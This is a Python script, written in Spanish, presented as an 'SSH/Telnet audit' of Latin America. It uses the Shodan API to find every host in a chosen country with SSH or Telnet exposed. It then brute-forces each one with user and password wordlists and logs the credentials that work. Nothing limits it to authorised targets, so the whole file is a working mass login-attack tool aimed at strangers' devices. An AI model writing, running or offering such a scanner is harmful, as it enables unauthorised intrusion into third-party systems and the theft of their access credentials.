import os
from search import buscar_ips_shodan, validar_api_key
from utils import load_list
from ssh import validate_ssh
from telnet import validate_telnet
from logger import log_credenciales

def seleccionar_pais():
    paises = {
        "1": "AR",  # Argentina
        "2": "BO",  # Bolivia
        "3": "BR",  # Brasil
        "4": "CL",  # Chile
        "5": "CO",  # Colombia
        "6": "CR",  # Costa Rica
        "7": "CU",  # Cuba
        "8": "DO",  # República Dominicana
        "9": "EC",  # Ecuador
        "10": "GT", # Guatemala
        "11": "HN", # Honduras
        "12": "MX", # México
        "13": "NI", # Nicaragua
        "14": "PA", # Panamá
        "15": "PY", # Paraguay
        "16": "PE", # Perú
        "17": "PR", # Puerto Rico
        "18": "SV", # El Salvador
        "19": "UY", # Uruguay
        "20": "VE", # Venezuela
    }

    print("\n🌎 Elige un país de Latinoamérica:")
    for num, code in paises.items():
        print(f" {num}. {code}")
    
    opcion = input("\n👉 Ingresa el número del país: ")
    pais = paises.get(opcion)
    if not pais:
        print("❌ Opción inválida. Intenta de nuevo.")
        return seleccionar_pais()
    
    return pais

def main():
    print("🔐 Bienvenido a la Auditoría SSH en Latinoamérica")
    
    api_key = input("🔑 Ingresa tu Shodan API Key: ").strip()
    if not validar_api_key(api_key):
        print("❌ API Key inválida o sin créditos. Finalizando...")
        return

    pais = seleccionar_pais()
    query = f'(port:22 OR port:23) country:"{pais}"'

    print(f"\n🔍 Buscando dispositivos SSH/Telnet en {pais} usando Shodan...")
    ips = buscar_ips_shodan(api_key, query)

    if not ips:
        print("🚫 No se encontraron dispositivos o hubo un error.")
        return

    usuarios = load_list("credentials/users.txt")
    passwords = load_list("credentials/passwords.txt")

    if not usuarios or not passwords:
        print("⚠️ Archivos de usuarios o contraseñas vacíos.")
        return

    total_dispositivos = len(ips)
    total_intentos = 0
    aciertos = 0

    print(f"\n🌐 Dispositivos encontrados: {total_dispositivos}")
    print(f"🔄 Comenzando pruebas de acceso por SSH y Telnet...\n")

    for ip in ips:
        print(f"\n📌 Probando IP: {ip}")
        for user in usuarios:
            for pwd in passwords:
                total_intentos += 1

                # SSH
                print(f"  → [SSH] {user}:{pwd} ", end="")
                if validate_ssh(ip, user, pwd):
                    aciertos += 1
                    print("✅ ¡Acceso válido!")
                    log_credenciales(ip, user, pwd, servicio="SSH")
                else:
                    print("❌ Falló")

                # Telnet
                print(f"  → [Telnet] {user}:{pwd} ", end="")
                if validate_telnet(ip, user, pwd):
                    aciertos += 1
                    print("✅ ¡Acceso válido!")
                    log_credenciales(ip, user, pwd, servicio="Telnet")
                else:
                    print("❌ Falló")

    print("\n📊 RESUMEN DE LA AUDITORÍA SSH/TELNET")
    print("-" * 40)
    print(f"🖥️  Dispositivos revisados  : {total_dispositivos}")
    print(f"🔁  Intentos realizados     : {total_intentos * 2} (x2 por protocolo)")
    print(f"🔐  Credenciales válidas    : {aciertos}")
    print("-" * 40)

    os.makedirs("logs", exist_ok=True)
    with open("logs/resumen_final.log", "w") as f:
        f.write("RESUMEN DE LA AUDITORÍA SSH/TELNET\n")
        f.write("-" * 40 + "\n")
        f.write(f"Dispositivos revisados  : {total_dispositivos}\n")
        f.write(f"Intentos realizados     : {total_intentos * 2}\n")
        f.write(f"Credenciales válidas    : {aciertos}\n")
        f.write("-" * 40 + "\n")

if __name__ == "__main__":
    main()
